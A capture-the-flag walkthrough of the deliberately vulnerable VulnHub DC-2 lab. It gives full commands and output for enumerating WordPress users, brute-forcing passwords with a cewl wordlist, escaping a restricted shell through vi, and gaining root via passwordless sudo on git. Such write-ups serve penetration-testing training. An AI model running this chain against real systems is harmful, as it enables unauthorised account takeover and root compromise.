# VulnHub > DC 2

**About Release**

* Name: DC: 2
* Date release: 22 Mar 2019
* Author: DCAU
* Series: DC
* Web page: http://www.five86.com/dc-2.html

**Description**

Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.

As with the original DC-1, it's designed with beginners in mind.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

Just like with DC-1, there are five flags including the final flag.

And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.

In short, the only flag that really counts, is the final flag.

For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.

I haven't explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.

**Download**

* DC-2.zip (Size: 847 MB)
* Download: http://www.five86.com/downloads/DC-2.zip
* Download (Mirror): https://download.vulnhub.com/dc/DC-2.zip
* Download (Torrent): https://download.vulnhub.com/dc/DC-2.zip.torrent ([Magnet](magnet:?xt=urn:btih:B048406399C175708F43F46C707C93281F39BF85&dn=DC-2.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

# Flag 1

## Services Enumeration

Nmap discovers 2 ports: HTTP on the standard port 80, and SSH, running on a non-standard port (7744):

~~~
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Expected hostname

The webserver expects requests to be sent to `dc-2`:

~~~
kali@kali:/data/DC-2$ curl -I 172.16.222.157
HTTP/1.1 301 Moved Permanently
Date: Tue, 06 Oct 2020 11:12:03 GMT
Server: Apache/2.4.10 (Debian)
Location: http://dc-2/
Content-Type: text/html; charset=UTF-8
~~~

Let's add this name to our hosts file:

~~~
$ echo "172.16.222.157 dc-2" | sudo tee -a /etc/hosts
~~~

## Wordpress users enumeration

Connecting with our browser to `http://dc-2` shows a Wordpress page. Let's use `wpscan` to enumerate the users:

~~~
kali@kali:/data/DC-2/files$ wpscan --url http://dc-2 -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://dc-2/ [172.16.222.157]
[+] Started: Tue Oct  6 14:35:06 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Tue Oct  6 14:35:10 2020
[+] Requests Done: 56
[+] Cached Requests: 6
[+] Data Sent: 12.641 KB
[+] Data Received: 514.536 KB
[+] Memory used: 175.562 MB
[+] Elapsed time: 00:00:03
~~~

Let's save this list of 3 potential users:

~~~
$ cat > users.txt << EOF
admin
jerry
tom
EOF
~~~

## First flag in the public posts

Without authentication, we can read several posts ("Welcome", "What We Do", "Our People", "Our Products", "Flag"), one of which is the first flag:

~~~
kali@kali:/data/DC-2/files$ curl -s http://dc-2/index.php/flag/ | html2text 

Skip_to_content
[DC-2]
DC-2
Just another WordPress site
     Menu
    * Welcome
    * What_We_Do
    * Our_People
    * Our_Products
    * Flag

****** Flag ******
Flag 1:
Your usual wordlists probably won’t work, so instead, maybe you just need to be
cewl.
More passwords is always better, but sometimes you just can’t win them all.
Log in as one to see the next flag.
If you can’t find it, log in as another.

Proudly_powered_by_WordPress
~~~

# Flag 2

## Brute force the Wordpress accounts

We already have a list of users, and we need a dictionary to perform a brute force attack. The first flag recommends using `cewl` to build a custom dictionary from the content of the website. Let's do it:

~~~
kali@kali:/data/DC-2/files$ cewl -w dict.txt -d 3 http://dc-2/index.php/
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
~~~

Now provided with a users list as well as a custom dictionary, we're good to perform a brute force attack:

~~~
kali@kali:/data/DC-2/files$ wpscan --url http://dc-2 -U users.txt -P dict.txt 

[REDACTED]

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

[REDACTED]

~~~

We are provided with 2 valid credentials.

## Connect as `jerry`

Go to http://wp-admin/ and connect with `jerry:adipiscing`. Then, go to "Pages > All pages" and click on the page called "Flag 2".

## Second flag

Here is the content of the "Flag 2" page:

~~~
Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
~~~

# Flag 3

## SSH connection

As we haven't been able to find the `admin`'s password, we can't use the usual exploits against Wordpress to make a reverse shell. Let's instead try to authenticate against the SSH service, using the credentials found previously. It works for `tom`:

~~~
kali@kali:/data/DC-2/files$ sshpass -p "parturient" ssh tom@dc-2 -p 7744

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct  6 09:42:07 2020 from 172.16.222.128
tom@DC-2:~$ id
-rbash: id: command not found
tom@DC-2:~$ python -c "import pty;pty.spawn('/bin/bash')"
-rbash: python: command not found
tom@DC-2:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
-rbash: python3: command not found
tom@DC-2:~$ 
~~~

## Flag 3

We are in a restricted shell, which doesn't allow `cat`, `more`, `xxd`. We are still able to read the flag using the `less` command:

~~~
tom@DC-2:~$ ls -la /home/tom
total 40
drwxr-x--- 3 tom  tom  4096 Mar 21  2019 .
drwxr-xr-x 4 root root 4096 Mar 21  2019 ..
-rwxr-x--- 1 tom  tom    66 Mar 21  2019 .bash_history
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc
-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profile
drwxr-x--- 3 tom  tom  4096 Mar 21  2019 usr
tom@DC-2:~$ cat flag3.txt
-rbash: cat: command not found
tom@DC-2:~$ xxd flag3.txt
-rbash: xxd: command not found
tom@DC-2:~$ more flag3.txt
-rbash: more: command not found
tom@DC-2:~$ less flag3.txt
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
~~~

# Flag 4

## Evade the restricted bash (rbash)

Reading the previous flag was quite trivial in the restricted shell, but we obviously need to escape from it. As `vi` is available, we can do as follows:

~~~
vi
:set shell=/bin/bash
:shell
~~~

Now, we need to add some paths to the `PATH` envioronment variable:

~~~
tom@DC-2:/usr/bin$ export PATH=$PATH:/usr/local/bin:/usr/bin:/bin
~~~

## Lateral move (tom -> jerry)

Let's use the credentials found previously to switch to `jerry`:

~~~
tom@DC-2:/usr/bin$ su jerry
Password: adipiscing
jerry@DC-2:/usr/bin$ id
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry)
~~~

## Fourth flag

Let's read the 4th flag, in `jerry`'s home:

~~~
jerry@DC-2:~$ ls -la /home/jerry/
total 28
drwxr-xr-x 2 jerry jerry 4096 Mar 21  2019 .
drwxr-xr-x 4 root  root  4096 Mar 21  2019 ..
-rw------- 1 jerry jerry  109 Mar 21  2019 .bash_history
-rw-r--r-- 1 jerry jerry  220 Mar 21  2019 .bash_logout
-rw-r--r-- 1 jerry jerry 3515 Mar 21  2019 .bashrc
-rw-r--r-- 1 jerry jerry  223 Mar 21  2019 flag4.txt
-rw-r--r-- 1 jerry jerry  675 Mar 21  2019 .profile
jerry@DC-2:~$ cat flag4.txt 
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
~~~

# Final flag (root flag)

## Privilege escalation

Checking `jerry`'s privileges reveals that we can run `git` as `root` without password:

~~~
jerry@DC-2:/$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/git/#sudo) reveals that we can exploit this to elevate our privileges:

~~~
jerry@DC-2:/$ sudo git -p help config

[REDACTED]

!/bin/bash
root@DC-2:/# id
uid=0(root) gid=0(root) groups=0(root)
~~~

## Root flag

Now with a privileged shell, let's get the root flag:

~~~
root@DC-2:/# cd /root
root@DC-2:~# ls -la
total 32
drwx------  2 root root 4096 Mar 21  2019 .
drwxr-xr-x 21 root root 4096 Mar 10  2019 ..
-rw-------  1 root root  207 Mar 21  2019 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  427 Mar 21  2019 final-flag.txt
-rw-------  1 root root   46 Mar 21  2019 .lesshst
-rw-------  1 root root  232 Mar 21  2019 .mysql_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
root@DC-2:~# cat final-flag.txt 
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
~~~
